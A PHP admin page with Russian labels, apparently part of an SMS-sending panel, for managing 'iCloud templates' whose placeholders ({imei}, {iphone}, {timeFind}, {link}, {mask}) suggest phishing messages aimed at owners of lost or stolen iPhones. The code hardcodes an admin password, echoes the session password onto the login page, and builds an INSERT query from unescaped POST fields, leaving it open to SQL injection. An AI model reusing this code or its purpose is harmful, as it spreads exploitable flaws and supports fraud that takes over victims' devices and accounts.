<?
header("Content-Type: text/html; charset=utf-8");
require_once("sms/Functions.php");
include("DBConnect.php");
session_start();
if(empty($_POST))
{
?>

<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="stylesheet" type="text/css" href="css/theme.blue.css">
<link rel="stylesheet" type="text/css" href="css/jquery.formstyler.css">
<script src = "js/jquery-1.12.3.min.js"></script>
<script src = "js/jquery.form.min.js"></script>
<script src = "js/bootstrap.min.js"></script>
<script src = "js/date.js"></script>

<meta charset="utf-8">
<title>Добавление Шаблона iCloud</title>
</head>
<body>
<?
if($_SESSION['password'] == "19733791Zx")
{
?>
	<button id = "SMSSender" class="myButton" onclick="location.href='<?=getUrl();?>/'">Расширение</button>
	<button id = "manager" class="myButton" onclick="location.href='<?=getUrl();?>/SMSManager.php'">Менеджер</button>
	<button onclick="location.href='<?=getUrl();?>/SMSReport.php'" id = "SMSReport" class="myButton" style="width: 70px">Отчёт</button>
	<table id="myTable" class="tablesorter tablesorter-blue">
		<thead>
			<tr class="tablesorter-headerRow">
				<td data-column="id" data-sortby="ASC" style="cursor: pointer;">№</td>
				<td data-column="name" style="cursor: pointer;">Название</td>
				<td data-column="text" style="cursor: pointer;">Текст</td>
				<td data-column="time_format" style="cursor: pointer;">Формат времени</td>
				<td style="cursor: default;">Действие</td>
			</tr>
		</thead>
		<tbody>

		</tbody>
	</table>
	<button type="button" class="btn btn-success active" id="addTemplate" data-toggle="modal" data-target="#exampleModal">Добавить шаблон</button>
	<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
		<div class="modal-dialog" role="document">
			<form action = "icloud_templates.php" id = "addForm" role="form" method = "POST">
				<div class="modal-content">
					<div class="modal-header">
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
					<div class="modal-body">
						<div class = "row" style = "margin-top: 50px;">
							<div class = "col-md-8 col-md-offset-2">
								<h2>Добавление шаблона iCloud</h2><br>
								<div class="form-group">
									<div class="form-group">
											<label for="text">Текст</label>
											<textarea class="form-control" id="mText" placeholder="Текст шаблона" rows = "20" name = "text" required></textarea>
											<p class="help-block">{imei} - IMEI номер устройства; {iphone} - модель устройства; {timeFind} - время и дата; {link} - ссылка; {mask} - маска; {custom1},{custom2},{custom3} - дополнительные параметры</p>
									</div>
									<input type="hidden" id="action">
									<label for="text">Название</label><input id="mName" name="name" class="form-control">
								</div>
							</div>
						</div>
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-secondary" data-dismiss="modal">Закрыть</button>
						<input type="submit" id="save" class = "btn btn-large btn-success" value="Добавить"></input>
					</div>
				</div>
			</form>
		</div>
	</div>
<script>
$('td').click(function(){
	var column = $(this).data('column');
	if(!!column)
	{
		var sortBY = $(this).attr('data-sortby');
		if(!!!sortBY || sortBY == 'DESC') { $('td[data-sortby]').removeAttr('data-sortby'); $(this).attr('data-sortby', 'ASC'); }
		else $(this).attr('data-sortby', 'DESC');
	}
});
$('#addTemplate').click(function(){
	$('h2').text('Добавление шаблона');
	$('#action').val('add');
	$('#addForm')[0].reset();
	$('#save').val('Добавить');
});
$('#addForm').submit(function() {
	var action = $('#action').val();
	if(action != "add")
	{
		$.ajax({
			type: "POST",
			url: "functions.php",
			data: {'function':'deleteTemplate_iCloud', 'id':action},
			success: function(e)
			{
			}
		});
	}
	var formData = new FormData(this);
	$.ajax({
		type: "POST",
		url: "icloud_templates.php",
		data: formData,
		async: false,
		success: function(e)
		{
			setTimeout(function(){location.reload();}, 800);
		},
		cache: false,
		contentType: false,
		processData: false
	});
	return false;
});
function DeleteTemplate_iCloud(id)
{
	if(confirm("Вы действительно хотите удалить шаблон?"))
	{
		$.ajax({
			type: "POST",
			url: "functions.php",
			data: {'function':'deleteTemplate_iCloud', 'id':id},
			success: function(e)
			{
			}
		});
		return false;
	}
}
function ActivateTemplate_iCloud(id, value)
{
	$.ajax({
		type: "POST",
		url: "functions.php",
		data: {'function':'activateTemplate_iCloud', 'id':id, 'value':value},
		success: function(e)
		{
		}
	});
	return false;
}
function EditTemplate_iCloud(id)
{
	$('#exampleModal').modal('show');
	$('#save').val('Сохранить');
	$('h2').text('Редактирование шаблона');
	$('#action').val(id);
	$.ajax({
		type: "POST",
		url: "functions.php",
		data: {'function':'editTemplate_iClous', 'id':id},
		dataType: 'json',  
		success: function(e)
		{
			var name = e[1];
			$('#mName').val(name);
			var time = e[3];
			$('#mTime').val(time).trigger("change");
			var text = e[2];
			$('#mText').val(text);
		}
	});
}
function updateTable()
{
	var td = $('td[data-sortby]');
	var column = td.attr('data-column');
	var sortBY = td.attr('data-sortby');
	console.log('column = '+column+' sort = '+sortBY);
	$.ajax({
		type: "POST",
		url: "functions.php",
		data: {'function':'updateTable', 'table':'icloud_templates', 'column':column, 'sortBY':sortBY},
		success: function(e)
		{
			$('tbody').html(e);
		}
	});
}
$(document).ready(function()
{
	updateTable();
	setInterval(function()
	{
		updateTable();
	}, 300);
	// $('button').mouseover(function(){flag = false});
	// $('button').mouseout(function(){flag = true});
});
</script>
</body>
</html>
<?
}
else
{
?>
<div class = "row" style = "margin-top: 50px;">
        <div class = "col-md-8 col-md-offset-2">
                <h2>&nbsp;Session: <? echo $_SESSION['password']; ?>Ввод пароля</h2><br>
				<div id="timeDisp"><script>timeDisp();</script></div>
    <hr>
                <form action = "login.php" method = "POST">
                        <div class="form-group">
							<label for="text        ">Пароль:</label>
						    <input type="text" id="password" name="password" class="form-control"/>
                        </div>
                        <input type="submit" class = "btn btn-large btn-success" value="Вход"></input>
                </form>
        </div>
</div>
<?
}
?>
<?
}
else
{
	$text = $_POST['text'];
	$time = $_POST['time'];
	$name = $_POST['name'];
	$text = mysql_real_escape_string($text);
	$query = "INSERT INTO `icloud_templates` (`name`, `text`, `time_format`) VALUES ('$name', '$text', '$time');"; mysql_query($query);
	echo "<script>location.href=\"/icloud_templates.php\";</script>";
}
?>